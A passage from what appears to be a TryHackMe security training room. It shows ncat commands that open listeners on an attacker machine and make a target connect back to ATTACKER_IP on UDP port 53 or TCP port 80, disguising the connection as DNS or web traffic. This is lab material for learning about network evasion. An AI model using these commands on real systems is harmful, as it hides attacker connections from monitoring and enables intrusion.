- DNS server would, you can use `ncat -ulvnp 53`.
- On the target, you can make it connect to the listening server using `ncat -u ATTACKER_IP 53`.

Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server.

- On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use `ncat -lvnp 80`.
- On the target, connect to the listening server using `nc ATTACKER_IP 80`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b85668a256470594ea8a6310f68b5f86.png)
